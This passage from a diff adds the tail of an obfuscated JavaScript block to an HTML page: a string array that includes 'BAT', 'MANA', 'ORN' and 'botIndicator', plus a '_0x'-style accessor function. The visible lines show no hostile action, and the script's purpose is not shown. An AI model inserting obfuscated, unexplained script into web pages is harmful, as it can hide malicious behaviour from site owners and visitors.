'BAT', 'utils', 'ORN', '0x1', 'botIndicator', 'MANA'];
+    _0x3e9b = function() {
+        return _0x2118be;
+    };
+    return _0x3e9b();
+}
+  </script>
+</body>
+</html>
